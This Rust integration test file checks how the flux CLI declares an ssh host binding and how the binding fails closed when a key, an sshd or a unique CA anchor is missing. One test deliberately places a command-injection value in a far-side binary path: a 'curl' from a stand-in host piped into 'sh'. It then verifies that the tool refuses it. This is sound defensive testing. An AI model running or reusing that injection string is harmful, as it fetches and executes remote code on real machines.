//! C-683: the `ssh` host binding's declaration surface and its fail-closed faces, through the real
//! CLI.
//!
//! `ssh` is a *bootstrap*, never a substrate: the far side must still be the flux binary serving
//! the remote protocol. What this file pins is everything an operator can observe without a far
//! machine — that the kind is declarable and rendered, that the closed vocabulary still refuses an
//! unknown kind, and that each way the bootstrap can fail names the missing piece rather than
//! falling back to running effects locally. The full bootstrap → forward → handshake chain against
//! a real sshd lives in `crates/flux-server/tests/ssh_host_bootstrap.rs`.

use std::path::{Path, PathBuf};
use std::process::Command;

struct TempDir(PathBuf);

impl TempDir {
    fn new(tag: &str) -> Self {
        let path = std::env::temp_dir().join(format!(
            "flux-{tag}-{}-{:?}",
            std::process::id(),
            std::thread::current().id()
        ));
        let _ = std::fs::remove_dir_all(&path);
        std::fs::create_dir_all(&path).unwrap();
        Self(path)
    }

    fn path(&self) -> &Path {
        &self.0
    }
}

impl Drop for TempDir {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.0);
    }
}

/// A workspace whose project config declares `body` as its `[[host]]` table, and a `HOME` of its
/// own so no test ever reads or writes the operator's `~/.flux`.
fn workspace_declaring(tag: &str, body: &str) -> TempDir {
    let dir = TempDir::new(tag);
    std::fs::create_dir_all(dir.path().join(".flux")).unwrap();
    std::fs::write(dir.path().join(".flux").join("config.toml"), body).unwrap();
    std::fs::create_dir_all(dir.path().join("home")).unwrap();
    dir
}

struct Output {
    stdout: String,
    stderr: String,
    ok: bool,
}

impl Output {
    fn all(&self) -> String {
        format!("{}\n{}", self.stdout, self.stderr)
    }
}

fn flux(dir: &TempDir, args: &[&str], env: &[(&str, &str)]) -> Output {
    let mut command = Command::new(env!("CARGO_BIN_EXE_flux"));
    command
        .args(args)
        .current_dir(dir.path())
        .env("HOME", dir.path().join("home"))
        // C-262: declare the posture rather than inheriting the runner's. These faces are about
        // what the *binding* refuses, and a runner with no confinement backend would otherwise turn
        // every one of them into a sandbox refusal that says nothing about ssh.
        .env("FLUX_SANDBOX", "off")
        .env_remove("FLUX_SSH_KEY")
        .env_remove("FLUX_REMOTE_SYSTEM_TOKEN");
    for (key, value) in env {
        command.env(key, value);
    }
    let out = command.output().expect("the flux binary runs");
    Output {
        stdout: String::from_utf8_lossy(&out.stdout).to_string(),
        stderr: String::from_utf8_lossy(&out.stderr).to_string(),
        ok: out.status.success(),
    }
}

/// Acceptance 1, the vocabulary half: `ssh` is a declarable `[[host]]` backend carrying an ssh
/// target, an optional far-side binary path and a credential *reference* for the key, and it
/// renders through `flux host ls` like any other binding.
#[test]
fn the_ssh_backend_kind_is_declarable_and_rendered() {
    let dir = workspace_declaring(
        "ssh-declarable",
        r#"
[[host]]
id = "devbox"
backend = "ssh"
url = "ssh://build@devbox.internal:2222"
credential_ref = "env/FLUX_SSH_KEY"
grant = ["operator"]
ssh = { binary = "/usr/local/bin/flux", serve_port = 8790 }
"#,
    );

    let listed = flux(&dir, &["host", "ls", "--output", "json"], &[]);
    assert!(listed.ok, "`flux host ls` failed: {}", listed.all());
    let doc: serde_json::Value = serde_json::from_str(&listed.stdout)
        .unwrap_or_else(|e| panic!("`host ls` emits JSON ({e}): {}", listed.all()));
    let host = &doc["hosts"][0];
    assert_eq!(host["id"], "devbox", "{doc}");
    assert_eq!(host["backend"], "ssh", "{doc}");
    // Weak by construction: the key is a location, and no value can appear because none is read.
    assert_eq!(host["credential_ref"], "env/FLUX_SSH_KEY", "{doc}");
    assert!(
        host["availability"]
            .as_str()
            .is_some_and(|text| text.contains("probe")),
        "an ssh binding is a declaration until a probe bootstraps it: {doc}"
    );
}

/// The closed vocabulary stays closed, and now names `ssh` when it refuses.
#[test]
fn an_unknown_backend_kind_is_still_a_hard_error_that_names_ssh() {
    let dir = workspace_declaring(
        "ssh-unknown-kind",
        r#"
[[host]]
id = "warpdrive"
backend = "warp"
"#,
    );
    let listed = flux(&dir, &["host", "ls", "--output", "json"], &[]);
    assert!(
        !listed.ok,
        "an unknown backend kind must stay a hard config error: {}",
        listed.all()
    );

    let added = flux(
        &dir,
        &["host", "add", "warpdrive", "--backend", "warp"],
        &[],
    );
    assert!(!added.ok, "{}", added.all());
    assert!(
        added.all().contains("ssh"),
        "the refusal lists the known kinds, which now include `ssh`: {}",
        added.all()
    );
}

/// Acceptance 1, the fail-closed half: no usable key. The credential is a *reference*; when it
/// resolves to nothing there is no key to offer sshd, and the binding refuses by name rather than
/// falling back to an agent, a password prompt, or the local substrate.
#[test]
fn an_ssh_binding_with_no_usable_key_fails_closed_naming_the_credential() {
    let dir = workspace_declaring(
        "ssh-no-key",
        r#"
[[host]]
id = "devbox"
backend = "ssh"
url = "ssh://build@devbox.internal:2222"
credential_ref = "env/FLUX_SSH_KEY"
grant = ["operator"]
"#,
    );

    let probed = flux(&dir, &["host", "probe", "devbox", "--output", "json"], &[]);
    assert!(!probed.ok, "{}", probed.all());
    let doc: serde_json::Value = serde_json::from_str(&probed.stdout)
        .unwrap_or_else(|e| panic!("`host probe` emits JSON ({e}): {}", probed.all()));
    assert_eq!(doc["failure"]["class"], "credential_unavailable", "{doc}");
    assert!(
        doc["failure"]["reference"] == "env/FLUX_SSH_KEY",
        "the refusal names the reference, never a value: {doc}"
    );

    // And a key reference that resolves to a path with no file behind it is the same face, said
    // about the piece that is actually missing.
    let absent = dir.path().join("home").join("nonexistent-key");
    let probed = flux(
        &dir,
        &["host", "probe", "devbox", "--output", "json"],
        &[("FLUX_SSH_KEY", absent.to_str().unwrap())],
    );
    assert!(!probed.ok, "{}", probed.all());
    assert!(
        probed.all().contains("nonexistent-key"),
        "the refusal names the missing key file: {}",
        probed.all()
    );
}

/// Acceptance 1, the fail-closed half: no far-side binary the operator can name. Installing flux on
/// the far machine stays the operator's step (the C-480 boundary), so a binding that declares no
/// way to start a serve and finds nothing serving refuses rather than improvising.
#[test]
fn a_far_side_path_that_could_reach_a_shell_is_refused_before_any_connection() {
    let dir = workspace_declaring(
        "ssh-metachars",
        r#"
[[host]]
id = "devbox"
backend = "ssh"
url = "ssh://build@devbox.internal:2222"
credential_ref = "env/FLUX_SSH_KEY"
grant = ["operator"]
ssh = { binary = "/usr/local/bin/flux; curl evil.example | sh" }
"#,
    );
    let key = dir.path().join("home").join("id_test");
    std::fs::write(&key, "not-a-real-key\n").unwrap();

    let probed = flux(
        &dir,
        &["host", "probe", "devbox", "--output", "json"],
        &[("FLUX_SSH_KEY", key.to_str().unwrap())],
    );
    assert!(!probed.ok, "{}", probed.all());
    assert!(
        probed.all().contains("shell"),
        "a far-side path the login shell would re-interpret is refused by name: {}",
        probed.all()
    );
}

/// Acceptance 1, the fail-closed half: no sshd reachable. The bootstrap names that, and nothing
/// falls back to running the effect here.
#[test]
fn an_ssh_binding_with_no_sshd_reachable_fails_closed_naming_it() {
    let Some(_ssh) = which("ssh") else {
        eprintln!(
            "disposition: no `ssh` client on PATH, so the bootstrap cannot be attempted here; the \
             reachability face is covered wherever OpenSSH is installed"
        );
        return;
    };
    // A loopback port with nothing behind it: bound and released, so the connection is refused
    // rather than filtered, and the test cannot hang on a firewall.
    let closed = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let port = closed.local_addr().unwrap().port();
    drop(closed);

    let dir = workspace_declaring(
        "ssh-no-sshd",
        &format!(
            r#"
[[host]]
id = "devbox"
backend = "ssh"
url = "ssh://build@127.0.0.1:{port}"
credential_ref = "env/FLUX_SSH_KEY"
grant = ["operator"]
"#
        ),
    );
    let key = dir.path().join("home").join("id_test");
    std::fs::write(&key, "not-a-real-key\n").unwrap();

    let probed = flux(
        &dir,
        &["host", "probe", "devbox", "--output", "json"],
        &[
            ("FLUX_SSH_KEY", key.to_str().unwrap()),
            // Both credentials resolve, so the only thing left to fail is the reachability the
            // test is about — the refusal must be about sshd, not about a secret.
            ("FLUX_REMOTE_SYSTEM_TOKEN", "a-token-that-is-never-offered"),
        ],
    );
    assert!(!probed.ok, "{}", probed.all());
    let text = probed.all();
    assert!(
        text.contains("ssh") && (text.contains("refused") || text.contains("unreachable")),
        "the refusal names the missing sshd: {text}"
    );
    assert!(
        !text.contains("falling back") && !text.contains("locally"),
        "nothing ever falls back to the local substrate: {text}"
    );
}

/// C-684: `ca_cert` means the same thing on every binding kind that dials TLS, `ssh` included.
///
/// C-683 shipped an ssh-local anchor at `[host.ssh] ca` before `ca_cert` existed, so the risk this
/// pins is a binding that declares its CA in the ordinary place and has it quietly ignored — the
/// precise failure C-684 exists to remove. The ssh-local spelling stays authoritative where it is
/// used, but declaring *both* to different paths is refused naming both, because one of them would
/// otherwise have to lose silently.
#[test]
fn an_ssh_binding_honours_the_binding_level_ca_and_refuses_two_anchors() {
    let declare = |tag: &str, anchors: &str| {
        workspace_declaring(
            tag,
            &format!(
                r#"
[[host]]
id = "devbox"
backend = "ssh"
url = "ssh://build@devbox.internal:2222"
credential_ref = "env/FLUX_SSH_KEY"
grant = ["operator"]
{anchors}
"#
            ),
        )
    };

    // The binding-level anchor is accepted by the declaration surface and rendered as a location.
    let dir = declare("ssh-ca-binding", r#"ca_cert = "/etc/flux/devbox-ca.pem""#);
    let listed = flux(&dir, &["host", "ls", "--output", "json"], &[]);
    assert!(listed.ok, "`flux host ls` failed: {}", listed.all());
    let doc: serde_json::Value = serde_json::from_str(&listed.stdout)
        .unwrap_or_else(|e| panic!("`host ls` emits JSON ({e}): {}", listed.all()));
    assert_eq!(
        doc["hosts"][0]["ca_cert"], "/etc/flux/devbox-ca.pem",
        "an ssh binding declares its trust anchor in the ordinary field: {doc}"
    );

    // Two different anchors on one binding: refused, naming both, before anything is dialled.
    let dir = declare(
        "ssh-ca-conflict",
        "ca_cert = \"/etc/flux/one-ca.pem\"\nssh = { ca = \"/etc/flux/other-ca.pem\" }",
    );
    let key = dir.path().join("home").join("id_test");
    std::fs::write(&key, "not-a-real-key\n").unwrap();
    let probed = flux(
        &dir,
        &["host", "probe", "devbox", "--output", "json"],
        &[
            ("FLUX_SSH_KEY", key.to_str().unwrap()),
            ("FLUX_REMOTE_SYSTEM_TOKEN", "a-token-that-is-never-offered"),
        ],
    );
    assert!(!probed.ok, "{}", probed.all());
    let text = probed.all();
    assert!(
        text.contains("one-ca.pem") && text.contains("other-ca.pem"),
        "the refusal must name both anchors so the operator knows which to drop: {text}"
    );
}

fn which(program: &str) -> Option<PathBuf> {
    std::env::var_os("PATH").and_then(|path| {
        std::env::split_paths(&path)
            .map(|dir| dir.join(program))
            .find(|candidate| candidate.is_file())
    })
}
